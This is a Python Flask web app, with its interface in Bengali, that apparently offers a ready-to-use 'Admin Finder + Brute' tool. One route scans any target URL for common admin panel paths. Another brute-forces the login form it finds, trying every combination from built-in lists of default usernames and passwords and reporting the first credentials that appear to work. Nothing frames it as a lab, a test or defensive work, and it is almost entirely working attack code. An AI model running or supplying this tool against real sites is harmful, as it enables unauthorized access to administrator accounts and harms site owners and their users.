from flask import Flask, render_template_string, request
import requests
import itertools

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Admin Finder & Brute</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body{background:#0a0e17;color:#00ffcc;font-family:monospace;padding:20px}
        .box{max-width:800px;margin:auto;background:#111927;padding:25px;border-radius:15px}
        input,button{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:1px solid #00ffcc33;background:#1a2332;color:#00ffcc}
        button{background:#00ffcc22;cursor:pointer}
        .result{background:#0d1520;padding:15px;border-radius:8px;white-space:pre-wrap;color:#b0ffdd;margin-top:15px;max-height:400px;overflow:auto}
        h1{text-align:center;color:#00ffcc}
    </style>
</head>
<body>
<div class="box">
    <h1>🛡️ Admin Finder + Brute</h1>
    <h3>🔍 অ্যাডমিন প্যানেল খুঁজুন</h3>
    <form method="POST" action="/find">
        <input type="text" name="url" placeholder="http://target.com" required>
        <button type="submit">Scan</button>
    </form>
    <h3>🔑 ব্রুটফোর্স অ্যাটাক</h3>
    <form method="POST" action="/attack">
        <input type="text" name="login_url" placeholder="http://target.com/admin/login" required>
        <input type="text" name="user_field" placeholder="ইউজারনেম ফিল্ড (খালি রাখলে শুধু পাস চেক করবে)" value="">
        <input type="text" name="pass_field" placeholder="পাসওয়ার্ড ফিল্ড" value="password">
        <button type="submit">Attack</button>
    </form>
    {% if result %}
    <div class="result">{{ result }}</div>
    {% endif %}
</div>
</body>
</html>
"""

def find_admin(url):
    paths = ['/admin','/admin.php','/login','/wp-admin','/administrator','/panel','/dashboard','/admincp','/cpanel','/user','/auth','/backend','/admin_area']
    found=[]
    if not url.startswith(('http://','https://')):
        url='http://'+url
    for p in paths:
        try:
            r=requests.get(url.rstrip('/')+p, timeout=2)
            if r.status_code in [200,301,302,401,403]:
                found.append(f"✅ {url.rstrip('/')+p}  → {r.status_code}")
        except:
            found.append(f"⚠️ {p} → error")
    return "\n".join(found) if found else "❌ কিছু পাওয়া যায়নি"

def brute_force(login_url, user_field, pass_field):
    if not login_url.startswith(('http://','https://')):
        login_url='http://'+login_url

    # ডিফল্ট ডিকশনারি
    passwords = ['admin','arif123','123456','password','12345','root','qwerty','abc123','111111','letmein','pass123','welcome','admin123','password123','123456789']
    usernames = ['admin','root','user','test','guest','manager','demo','superadmin','webmaster','sysadmin','admin123','admin12',]

    # ডুপ্লিকেট রিমুভ
    usernames = list(set(usernames))
    passwords = list(set(passwords))

    found = None

    # ইউজারনেম ফিল্ড খালি থাকলে শুধু পাস ট্রাই
    if not user_field.strip():
        for p in passwords:
            try:
                data = {pass_field: p}
                r = requests.post(login_url, data=data, timeout=2, allow_redirects=False)
                if r.status_code == 302 or (r.status_code==200 and any(w in r.text.lower() for w in ['dashboard','welcome','panel'])):
                    found = f"🎯 সফল! পাস: {p}"
                    break
            except:
                continue
    else:
        for u,p in itertools.product(usernames, passwords):
            try:
                data = {user_field: u, pass_field: p}
                r = requests.post(login_url, data=data, timeout=2, allow_redirects=False)
                if r.status_code == 302 or (r.status_code==200 and any(w in r.text.lower() for w in ['dashboard','welcome','panel'])):
                    found = f"🎯 সফল! ইউজার: {u} | পাস: {p}"
                    break
            except:
                continue

    if found:
        return found
    else:
        return "❌ কোনো ক্রেডেনশিয়াল কাজ করেনি।"

@app.route('/', methods=['GET'])
def index():
    return render_template_string(HTML, result=None)

@app.route('/find', methods=['POST'])
def find():
    url = request.form.get('url','').strip()
    if not url:
        return render_template_string(HTML, result="URL দিন")
    res = find_admin(url)
    return render_template_string(HTML, result=res)

@app.route('/attack', methods=['POST'])
def attack():
    login_url = request.form.get('login_url','').strip()
    user_field = request.form.get('user_field','').strip()
    pass_field = request.form.get('pass_field','password').strip()
    if not login_url:
        return render_template_string(HTML, result="লগইন URL দিন")
    res = brute_force(login_url, user_field, pass_field)
    return render_template_string(HTML, result=res)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)